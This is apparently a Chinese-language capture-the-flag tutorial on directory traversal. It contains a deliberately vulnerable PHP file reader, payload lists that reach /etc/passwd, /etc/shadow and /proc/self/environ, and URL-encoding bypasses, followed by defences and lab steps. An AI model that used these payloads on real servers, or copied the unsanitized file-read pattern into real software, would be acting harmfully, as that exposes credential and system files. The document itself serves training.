# 目录遍历

## 概述

目录遍历（Directory Traversal）漏洞允许攻击者通过 `../` 跳出当前目录，访问服务器上的任意文件。

## 漏洞代码

```php
<?php
$file = $_GET['file'];
$filepath = "files/" . $file;
echo file_get_contents($filepath);
?>
```

## 攻击方式

### 1. 路径遍历

```
正常: ?file=readme.txt    →  files/readme.txt
攻击: ?file=../flag.txt   →  files/../flag.txt  =  flag.txt
攻击: ?file=../../etc/passwd  →  /etc/passwd
```

### 2. 常用 Payload

```
../flag.txt
../../flag.txt
../../../etc/passwd
../../../../etc/shadow
../../../var/log/apache2/access.log
```

### 3. 编码绕过

```
..%2f          URL 编码
..%252f        双重编码
..%c0%af       Unicode 编码
....//         双写绕过
```

## 常见敏感文件

```
/etc/passwd           # 用户列表
/etc/hosts            # 主机配置
/var/www/html/flag.txt  # CTF flag
/proc/self/environ    # 环境变量
/proc/version         # 内核版本
```

## 与 LFI 的区别

- **目录遍历**：读取文件内容
- **LFI**：包含并执行文件（PHP include）

## 防御

1. 使用白名单限制可访问的文件
2. 移除路径中的 `../`
3. 使用 `realpath()` 验证最终路径
4. 将可访问文件限制在特定目录

## 练习步骤

1. 访问文件查看功能
2. 尝试 `?file=../flag.txt`
3. 尝试读取 `/etc/passwd`
4. 查找 flag

## flag

在服务器上的 flag 文件中查找 `CR{...}` 格式的 flag。
